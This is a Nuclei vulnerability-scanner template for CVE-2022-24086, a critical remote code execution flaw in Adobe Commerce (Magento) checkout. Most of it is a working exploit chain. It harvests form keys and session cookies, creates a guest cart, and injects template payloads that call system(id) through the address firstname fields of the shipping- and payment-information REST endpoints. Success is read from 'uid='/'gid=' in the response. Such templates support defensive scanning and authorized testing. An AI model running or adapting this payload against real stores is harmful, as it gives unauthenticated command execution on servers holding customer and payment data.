id: CVE-2022-24086

info:
  name: Adobe Commerce (Magento) - Remote Code Execution
  author: daffainfo
  severity: critical
  description: |
    Adobe Commerce versions 2.4.3-p1 (and earlier) and 2.3.7-p2 (and earlier) are affected by an improper input validation vulnerability during the checkout process. Exploitation of this issue does not require user interaction and could result in arbitrary code execution.
  reference:
    - https://helpx.adobe.com/security/products/magento/apsb22-12.html
    - https://vovohelo.medium.com/reversing-a-magento-rce-cve-2022-24086-e991ead4d8af
    - https://labs.watchtowr.com/adobe-commerce-magento-rce-cve-2022-24086/
    - https://nvd.nist.gov/vuln/detail/CVE-2022-24086
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-24086
    cwe-id: CWE-20
    cpe: cpe:2.3:a:adobe:commerce:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 5  
    vendor: adobe
    product: commerce
    shodan-query: "X-Magento-Tags"
  tags: cve,cve2022,adobe,magento,commerce,rce,intrusive,kev,vkev

flow: http(1) && http(2) && http(3) && javascript(1)
# flow: http(1) && http(2) && http(3) && http(4) && http(5)

http:
  - method: GET
    path:
      - '{{BaseURL}}'

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(to_lower(body), "magento", "form_key")'
          - 'status_code == 200'
        condition: and
        internal: true

    extractors:
      - type: regex
        name: form_key
        part: body
        group: 1
        regex:
          - 'name="form_key"\s+type="hidden"\s+value="([0-9a-zA-Z]+)"'
        internal: true

      - type: regex
        name: product_id
        part: body
        group: 1
        regex:
          - 'data-product-id="([0-9]+)"'
        internal: true

      - type: regex
        name: phpsess_id
        part: header
        group: 1
        regex:
          - 'PHPSESSID=([0-9a-z]+)'
        internal: true

  - raw:
      - |
        POST /checkout/cart/add/uenc/aHR0cHM6Ly9ib2JpYW5zdXJmc2hvcC5jb20v%2C/product/{{product_id}}/ HTTP/1.1
        Host: {{Hostname}}
        Cookie: form_key={{form_key}}
        X-Requested-With: XMLHttpRequest
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2gMM6E6ZIRMtnlg4

        ------WebKitFormBoundary2gMM6E6ZIRMtnlg4
        Content-Disposition: form-data; name="product"

        {{product_id}}
        ------WebKitFormBoundary2gMM6E6ZIRMtnlg4
        Content-Disposition: form-data; name="form_key"

        {{form_key}}
        ------WebKitFormBoundary2gMM6E6ZIRMtnlg4--

    matchers:
      - type: dsl
        dsl:
          - contains(content_type, "application/json")
          - 'status_code == 200'
        condition: and
        internal: true

    extractors:
      - type: regex
        name: private_content_version
        part: header
        group: 1
        regex:
          - 'private_content_version=([0-9a-f]+)'
        internal: true

      - type: regex
        name: phpsessid
        part: header
        group: 1
        regex:
          - 'PHPSESSID=([0-9a-f]+)'
        internal: true

  - raw:
      - |
        GET /checkout HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(to_lower(body), "entity_id", "store_id", "formkey")'
          - 'status_code == 200'
        condition: and
        internal: true

    extractors:
      - type: regex
        name: entity_id
        part: body
        group: 1
        regex:
          - '"entity_id":"([0-9a-zA-Z]+)","store'
        internal: true

javascript:
  - code: |
      let m = require('nuclei/net');
      
      let address = Host+":"+Port;
      let conn,conn2;

      body1 = '{"addressInformation":{"shipping_address":{"countryId":"FR","regionCode":"","region":"","street":["test"],"company":"","telephone":"test","postcode":"12311","city":"test","firstname":"{{var this.getTemplateFilter().filter(foobar)}}{{var this.getTemplateFilter().addAfterFilterCallback(system).filter(id)}}","lastname":"test"},"billing_address":{"countryId":"FR","regionCode":"","region":"","street":["test"],"company":"","telephone":"test","postcode":"12311","city":"test","firstname":"{{var this.getTemplateFilter().filter(foobar)}}{{var this.getTemplateFilter().addAfterFilterCallback(system).filter(id)}}","lastname":"test","saveInAddressBook":null},"shipping_method_code":"flatrate","shipping_carrier_code":"flatrate","extension_attributes":{}}}';
      body2 = '{"cartId":"' + template.entity_id + '","billingAddress":{"countryId":"FR","regionCode":"","region":"","street":["test"],"company":"","telephone":"test","postcode":"12311","city":"test","firstname":"{{var this.getTemplateFilter().filter(foobar)}}{{var this.getTemplateFilter().addAfterFilterCallback(system).filter(id)}}","lastname":"test","saveInAddressBook":null},"paymentMethod":{"method":"checkmo","po_number":null,"additional_data":null},"email":"testa@m.com"}';

      try { 
        conn = m.OpenTLS('tcp', address);
      } catch {
        conn= m.Open('tcp', address);
      }

      let request1 = 'POST /rest/default/V1/guest-carts/' + template.entity_id + '/shipping-information HTTP/1.1\r\n' +
          'Host: ' + Host + '\r\n' +
          'Cookie: form_key=' + template.form_key + '; private_content_version=' + template.private_content_version + '; PHPSESSID=' + template.phpsess_id + '\r\n' +
          'Content-Type: application/json\r\n' +
          'Content-Length: 749\r\n\r\n' +
          body1;

      conn.Send(request1);
      resp = conn.RecvString(1000);

      try {
        conn2 = m.OpenTLS('tcp', address);
      } catch (e) {
        conn2 = m.Open('tcp', address);
      }

      let request2 = 'POST /rest/default/V1/guest-carts/' + template.entity_id + '/payment-information HTTP/1.1\r\n' +
                'Host: ' + Host + '\r\n' +
                'Cookie: form_key=' + template.form_key + '; private_content_version=' + template.private_content_version + '; PHPSESSID=' + template.phpsess_id + '\r\n' +
                'Content-Type: application/json\r\n' +
                'Content-Length: 470\r\n\r\n' +
                body2;

      log(request2);

      conn2.Send(request2);
      resp2 = conn2.RecvString(1000);
      Export(resp2);

    args:
      Host: "{{Host}}"
      PORT: 443

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(response, "uid=", "gid=")'

  # - raw:
  #     - |
  #       POST /rest/default/V1/guest-carts/{{entity_id}}/shipping-information HTTP/2
  #       Host: {{Hostname}}
  #       Content-Type: application/json

  #       {"addressInformation":{"shipping_address":{"countryId":"FR","regionCode":"","region":"","street":["test"],"company":"","telephone":"test","postcode":"12311","city":"test","firstname":"{{final_payload}}","lastname":"test"},"billing_address":{"countryId":"FR","regionCode":"","region":"","street":["test"],"company":"","telephone":"test","postcode":"12311","city":"test","firstname":"{{final_payload}}","lastname":"test","saveInAddressBook":null},"shipping_method_code":"flatrate","shipping_carrier_code":"flatrate","extension_attributes":{}}}

  #   matchers:
  #     - type: dsl
  #       dsl:
  #         - 'contains_all(body, "payment_methods", "totals")'
  #         - 'status_code == 200'
  #       condition: and
  #       internal: true

  # - raw:
  #     - |
  #       POST /rest/default/V1/guest-carts/{{entity_id}}/payment-information HTTP/2
  #       Host: {{Hostname}}
  #       Content-Type: application/json

  #       {"cartId":"{{entity_id}}","billingAddress":{"countryId":"FR","regionCode":"","region":"","street":["test"],"company":"","telephone":"test","postcode":"12311","city":"test","firstname":"{{final_payload}}","lastname":"test","saveInAddressBook":null},"paymentMethod":{"method":"checkmo","po_number":null,"additional_data":null},"email":"testa@m.com"}

  #   matchers:
  #     - type: dsl
  #       dsl:
  #         - 'contains_all(body, "uid=", "gid=")'
  #         - 'status_code == 200'
  #       condition: and
